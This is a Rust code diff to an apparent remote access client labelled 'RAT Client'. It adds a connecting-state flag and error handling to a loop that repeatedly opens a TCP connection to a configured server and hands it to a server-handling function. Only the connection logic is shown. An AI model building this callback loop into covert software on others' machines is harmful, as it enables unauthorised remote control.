@@ -42,7 +42,13 @@ fn main() {
     loop {
         let config_clone = config.clone();
         let is_connected_clone = is_connected.clone();
+        let is_connecting_clone = is_connecting.clone();
         let tray_icon_clone = tray_icon.clone();
+
+        if *is_connecting.lock().unwrap() {
+            sleep(std::time::Duration::from_secs(5));
+            continue;
+        }
 
         if *is_connected_clone.lock().unwrap() {
             tray_icon_clone.lock().unwrap().set_tooltip("RAT Client: Connected");
@@ -53,15 +59,33 @@ fn main() {
         }
 
         std::thread::spawn(move || {
-            *is_connected_clone.lock().unwrap() = true;
             println!("Connecting to server...");
+            {
+                *is_connecting_clone.lock().unwrap() = true;
+            }
             let stream = TcpStream::connect(format!("{}:{}", config_clone.ip, config_clone.port));
-            if let Ok(str) = stream {
-                handle_server(
-                    str.try_clone().unwrap(),
-                    str.try_clone().unwrap(),
-                    is_connected_clone
-                );
+
+            match stream {
+                Ok(str) => {
+                    {
+                        *is_connected_clone.lock().unwrap() = true;
+                        *is_connecting_clone.lock().unwrap() = false;
+                    }
+                    handle_server(
+                        str.try_clone().unwrap(),
+                        str.try_clone().unwrap(),
+                        is_connected_clone,
+                        is_connecting_clone
+                    );
+                }
+                Err(e) => {
+                    println!("Failed to connect to server: {}", e);
+                    {
+                        *is_connecting_clone.lock().unwrap() = false;
+                        *is_connected_clone.lock().unwrap() = false;
+                    }
+                    return;
+                }
             }
         });
         sleep(std::time::Duration::from_secs(5));
